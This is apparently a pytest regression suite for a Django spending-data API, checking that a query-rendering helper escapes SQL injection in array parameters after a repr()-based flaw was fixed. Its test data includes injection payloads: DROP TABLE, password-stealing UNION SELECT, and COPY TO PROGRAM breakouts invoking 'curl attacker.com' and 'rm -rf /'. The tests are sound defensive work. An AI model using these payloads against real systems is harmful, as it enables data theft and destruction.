
import pytest
from django.db import connection
from django.db.models import Q

from usaspending_api.common.helpers.orm_helpers import generate_raw_quoted_query


class TestSQLInjectionMitigation:
    """
    Test suite to verify SQL injection vulnerability in array parameters is mitigated.

    Original vulnerability: orm_helpers.py rendered list params via Python repr()
    into ARRAY[...] with no SQL escaping, allowing attackers to break out of
    string literals and inject arbitrary SQL.

    Fix: Now uses psycopg's mogrify() which properly escapes all parameters.
    """

    @pytest.mark.django_db
    def test_sql_injection_single_quote_in_array(self):
        """
        Test that single quote SQL injection attempts are escaped in array parameters.

        Attack vector: '; DROP TABLE users; --
        """
        from usaspending_api.search.models import TransactionSearch

        malicious = ["'; DROP TABLE users; --"]
        qs = TransactionSearch.objects.filter(business_categories__overlap=malicious)

        sql = generate_raw_quoted_query(qs)

        # Verify the SQL is safe - psycopg should escape the quotes
        # The malicious string should be present but escaped
        assert "DROP TABLE" in sql  # Present but as literal string
        # Should have escaped quotes (doubled or backslash-escaped)
        assert "''" in sql or "\\'" in sql or "E'" in sql
        # Should NOT have unescaped dangerous pattern that could execute
        assert sql.count("'; DROP TABLE users; --") == 0 or "''" in sql

    @pytest.mark.django_db
    def test_sql_injection_union_select_in_array(self):
        """
        Test that UNION SELECT injection attempts are escaped.

        Attack vector: ' UNION SELECT * FROM sensitive_table --
        """
        from usaspending_api.search.models import TransactionSearch

        malicious = ["' UNION SELECT * FROM sensitive_table --"]
        qs = TransactionSearch.objects.filter(business_categories__overlap=malicious)

        sql = generate_raw_quoted_query(qs)

        # UNION SELECT should be present but escaped as literal string
        assert "UNION SELECT" in sql
        # Should have proper escaping
        assert "''" in sql or "\\'" in sql or "E'" in sql

    @pytest.mark.django_db
    def test_backslash_injection_in_array(self):
        """
        Test that backslash escaping prevents PostgreSQL string literal breakout.

        Attack vector: \' to escape the quote in standard_conforming_strings=on
        """
        from usaspending_api.search.models import TransactionSearch

        malicious = ["test\\' OR 1=1 --"]
        qs = TransactionSearch.objects.filter(business_categories__overlap=malicious)

        sql = generate_raw_quoted_query(qs)

        # Backslashes should be properly escaped by psycopg
        assert "\\\\" in sql or "E'" in sql  # Either doubled or E-string syntax
        # The OR 1=1 should be neutralized
        assert "OR 1=1" in sql  # Present but as literal

    @pytest.mark.django_db
    def test_null_byte_injection_in_array(self):
        """
        Test that null bytes are rejected by psycopg.

        Attack vector: Using \x00 to terminate strings early

        psycopg3 correctly rejects null bytes as they cannot be stored in
        PostgreSQL text fields, preventing this attack vector entirely.
        """
        from psycopg import DataError

        from usaspending_api.search.models import TransactionSearch

        malicious = ["test\x00'; DROP TABLE users; --"]
        qs = TransactionSearch.objects.filter(business_categories__overlap=malicious)

        # psycopg should raise DataError for null bytes
        with pytest.raises(DataError, match="PostgreSQL text fields cannot contain NUL"):
            generate_raw_quoted_query(qs)

    @pytest.mark.django_db
    def test_repr_breakout_attack_in_array(self):
        """
        Test the original vulnerability: repr() context breakout.

        Original code: str_fix_param = "ARRAY{}".format(param)
        This used Python's repr() which could be exploited.
        """
        from usaspending_api.search.models import TransactionSearch

        # This is what an attacker would send
        malicious = ["test', (SELECT password FROM users LIMIT 1), 'end"]
        qs = TransactionSearch.objects.filter(business_categories__overlap=malicious)

        sql = generate_raw_quoted_query(qs)

        # The SELECT should be present but as a literal string, not executable
        assert "SELECT password FROM users" in sql
        # Should have proper quote escaping
        assert "''" in sql or "\\'" in sql or "E'" in sql

    @pytest.mark.django_db
    def test_recipient_type_names_attack_vector(self):
        """
        Test the specific attack vector mentioned in the vulnerability report.

        Attack path: recipient_type_names → business_categories__overlap
        The attacker sends malicious data through the recipient_type_names field.
        """
        from usaspending_api.search.models import TransactionSearch

        # Simulating the actual attack payload
        malicious_recipient_types = [
            "category_business",
            "'; SELECT * FROM download_job WHERE '1'='1",
            "corporate_entity_not_tax_exempt"
        ]

        qs = TransactionSearch.objects.filter(
            business_categories__overlap=malicious_recipient_types
        )

        sql = generate_raw_quoted_query(qs)

        # Verify SELECT is present but neutralized
        assert "SELECT * FROM download_job" in sql
        # Should have escaped quotes
        assert "''" in sql or "\\'" in sql or "E'" in sql
        # Should NOT have the raw unescaped attack string that could execute
        assert sql.count("'; SELECT * FROM download_job WHERE '1'='1") == 0 or "''" in sql

    @pytest.mark.django_db
    def test_copy_command_injection_prevention(self):
        """
        Test that COPY command injection is prevented.

        Original vulnerability: SQL was interpolated into \\COPY command
        shelled to psql, allowing command injection.
        """
        from usaspending_api.search.models import TransactionSearch

        # Attack attempting to break out of COPY and execute commands
        malicious = ["test') TO PROGRAM 'curl attacker.com'; --"]

        qs = TransactionSearch.objects.filter(business_categories__overlap=malicious)

        sql = generate_raw_quoted_query(qs)

        # The malicious payload should be escaped
        assert "TO PROGRAM" in sql  # Present but as literal
        # Should have proper escaping
        assert "''" in sql or "\\'" in sql or "E'" in sql

    @pytest.mark.django_db
    def test_multiple_array_parameters(self):
        """Test that multiple array parameters in one query are all escaped."""
        from usaspending_api.search.models import TransactionSearch

        malicious1 = ["'; DROP TABLE users; --"]
        malicious2 = ["'; DELETE FROM awards; --"]

        qs = TransactionSearch.objects.filter(
            business_categories__overlap=malicious1
        ).filter(
            type_description__in=malicious2
        )

        sql = generate_raw_quoted_query(qs)

        # Both malicious inputs should be present but escaped
        assert "DROP TABLE" in sql
        assert "DELETE FROM" in sql
        # Should have escaped quotes
        assert "''" in sql or "\\'" in sql or "E'" in sql

    @pytest.mark.django_db
    def test_string_parameter_escaping(self):
        """Test that regular string parameters are also properly escaped."""
        from usaspending_api.search.models import TransactionSearch

        malicious_string = "'; DROP TABLE users; --"

        qs = TransactionSearch.objects.filter(recipient_name=malicious_string)

        sql = generate_raw_quoted_query(qs)

        # Should be escaped by psycopg
        assert "DROP TABLE" in sql
        assert "''" in sql or "\\'" in sql or "E'" in sql
        # Should NOT have unescaped attack that could execute
        assert sql.count("'; DROP TABLE users; --") == 0 or "''" in sql

    @pytest.mark.django_db
    def test_integer_parameter_safety(self):
        """Test that integer parameters are handled safely."""
        from usaspending_api.search.models import TransactionSearch

        # Integers can't contain SQL injection, but test they work
        qs = TransactionSearch.objects.filter(award_id=12345)

        sql = generate_raw_quoted_query(qs)

        # Should contain the integer
        assert "12345" in sql
        # Should be valid SQL
        assert sql
        assert isinstance(sql, str)

    @pytest.mark.django_db
    def test_empty_queryset(self):
        """Test that querysets with no parameters work correctly."""
        from usaspending_api.search.models import TransactionSearch

        qs = TransactionSearch.objects.all()

        sql = generate_raw_quoted_query(qs)

        # Should generate valid SQL
        assert sql
        assert "SELECT" in sql.upper()
        assert isinstance(sql, str)

    @pytest.mark.django_db
    def test_mogrify_returns_string_not_bytes(self):
        """Test that the function always returns a string, not bytes."""
        from usaspending_api.search.models import TransactionSearch

        qs = TransactionSearch.objects.filter(
            business_categories__overlap=["test"]
        )

        sql = generate_raw_quoted_query(qs)

        # Should always return string, not bytes
        assert isinstance(sql, str)
        assert not isinstance(sql, bytes)

    @pytest.mark.django_db
    def test_comparison_with_vulnerable_behavior(self):
        """
        Document the difference between vulnerable and fixed behavior.

        This test demonstrates what the vulnerability was and how it's fixed.
        """
        from usaspending_api.search.models import TransactionSearch

        malicious = ["'; DROP TABLE users; --"]

        qs = TransactionSearch.objects.filter(business_categories__overlap=malicious)

        # NEW SAFE BEHAVIOR using mogrify:
        sql = generate_raw_quoted_query(qs)

        # The dangerous SQL should be present but escaped
        assert "DROP TABLE" in sql
        # Should have proper escaping (psycopg handles this)
        assert "''" in sql or "\\'" in sql or "E'" in sql

        # OLD VULNERABLE BEHAVIOR would have been:
        # ARRAY["'; DROP TABLE users; --"]
        # Where the quotes break out and DROP TABLE executes!

        # NEW SAFE BEHAVIOR produces something like:
        # ARRAY['''; DROP TABLE users; --'] or ARRAY[E'\'; DROP TABLE users; --']
        # Where it's treated as a literal string

    @pytest.mark.django_db
    @pytest.mark.parametrize("injection_payload", [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM awards WHERE '1'='1'; --",
        "' UNION SELECT password FROM auth_user --",
        "\\'; DROP TABLE transaction_search; --",
        # Removed null byte test case - tested separately above
        "') TO PROGRAM 'rm -rf /'; --",
        "', (SELECT string_agg(password, ',') FROM auth_user), '",
    ])
    def test_various_injection_payloads_in_array(self, injection_payload):
        """
        Test various SQL injection payloads are properly escaped.

        These are real-world attack patterns that should all be neutralized.
        Note: Null byte attacks are tested separately as psycopg rejects them.
        """
        from usaspending_api.search.models import TransactionSearch

        qs = TransactionSearch.objects.filter(
            business_categories__overlap=[injection_payload]
        )

        sql = generate_raw_quoted_query(qs)

        # Should generate valid SQL without crashing
        assert sql
        assert isinstance(sql, str)
        # Should contain the payload but escaped
        # (exact escaping depends on psycopg, but should be safe)
        assert "''" in sql or "\\'" in sql or "E'" in sql


class TestBackwardCompatibility:
    """Test that the fix doesn't break existing functionality."""

    @pytest.mark.django_db
    def test_legitimate_array_queries_still_work(self):
        """Verify legitimate use cases still function correctly."""
        from usaspending_api.search.models import TransactionSearch

        # Legitimate business categories
        legitimate = [
            "category_business",
            "corporate_entity_not_tax_exempt",
            "corporate_entity_tax_exempt"
        ]

        qs = TransactionSearch.objects.filter(
            business_categories__overlap=legitimate
        )

        sql = generate_raw_quoted_query(qs)

        # Should generate valid SQL
        assert sql
        assert isinstance(sql, str)
        assert "category_business" in sql
        assert "corporate_entity_not_tax_exempt" in sql

        # Should be executable
        with connection.cursor() as cursor:
            cursor.execute(sql)
            # Should not raise an exception

    @pytest.mark.django_db
    def test_non_array_parameters_unchanged(self):
        """Verify non-array parameters still work as before."""
        from usaspending_api.search.models import TransactionSearch

        qs = TransactionSearch.objects.filter(
            award_id=12345,
            recipient_name="ACME Corp"
        )

        sql = generate_raw_quoted_query(qs)

        assert "12345" in sql
        assert "ACME Corp" in sql
        assert isinstance(sql, str)

    @pytest.mark.django_db
    def test_complex_query_with_multiple_filters(self):
        """Test complex queries with multiple filter types."""
        from usaspending_api.search.models import TransactionSearch

        qs = TransactionSearch.objects.filter(
            award_id__gte=1000,
            recipient_name__icontains="Corp",
            business_categories__overlap=["category_business"],
            action_date__year=2024
        )

        sql = generate_raw_quoted_query(qs)

        # Should generate valid SQL with all filters
        assert sql
        assert isinstance(sql, str)
        assert "1000" in sql
        assert "Corp" in sql
        assert "category_business" in sql

    @pytest.mark.django_db
    def test_queryset_with_q_objects(self):
        """Test that Q objects work correctly."""
        from usaspending_api.search.models import TransactionSearch

        qs = TransactionSearch.objects.filter(
            Q(business_categories__overlap=["category_business"]) |
            Q(recipient_name="ACME Corp")
        )

        sql = generate_raw_quoted_query(qs)

        # Should generate valid SQL with OR condition
        assert sql
        assert isinstance(sql, str)

    @pytest.mark.django_db
    def test_special_characters_in_legitimate_data(self):
        """Test that legitimate data with special characters works."""
        from usaspending_api.search.models import TransactionSearch

        # Legitimate company names might have apostrophes
        legitimate_name = "O'Reilly Media"

        qs = TransactionSearch.objects.filter(recipient_name=legitimate_name)

        sql = generate_raw_quoted_query(qs)

        # Should handle apostrophe correctly
        assert sql
        assert isinstance(sql, str)
        assert "O" in sql and "Reilly" in sql
        # Should be properly escaped
        assert "''" in sql or "\\'" in sql or "E'" in sql


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    @pytest.mark.django_db
    def test_empty_array_parameter(self):
        """Test that empty arrays are handled correctly."""
        from usaspending_api.search.models import TransactionSearch

        qs = TransactionSearch.objects.filter(business_categories__overlap=[])

        sql = generate_raw_quoted_query(qs)

        # Should generate valid SQL
        assert sql
        assert isinstance(sql, str)
        # Should have empty array syntax
        assert "ARRAY[]" in sql or "'{}'" in sql

    @pytest.mark.django_db
    def test_null_in_array(self):
        """Test that NULL values in arrays are handled."""
        from usaspending_api.search.models import TransactionSearch

        qs = TransactionSearch.objects.filter(
            business_categories__overlap=["category_business", None]
        )

        sql = generate_raw_quoted_query(qs)

        # Should generate valid SQL
        assert sql
        assert isinstance(sql, str)
        assert "category_business" in sql

    @pytest.mark.django_db
    def test_unicode_characters(self):
        """Test that unicode characters are handled correctly."""
        from usaspending_api.search.models import TransactionSearch

        unicode_string = "Société Générale 日本"

        qs = TransactionSearch.objects.filter(recipient_name=unicode_string)

        sql = generate_raw_quoted_query(qs)

        # Should handle unicode correctly
        assert sql
        assert isinstance(sql, str)

    @pytest.mark.django_db
    def test_very_long_array(self):
        """Test that large arrays are handled efficiently."""
        from usaspending_api.search.models import TransactionSearch

        large_array = [f"category_{i}" for i in range(100)]

        qs = TransactionSearch.objects.filter(
            business_categories__overlap=large_array
        )

        sql = generate_raw_quoted_query(qs)

        # Should generate valid SQL
        assert sql
        assert isinstance(sql, str)
        assert "category_0" in sql
        assert "category_99" in sql
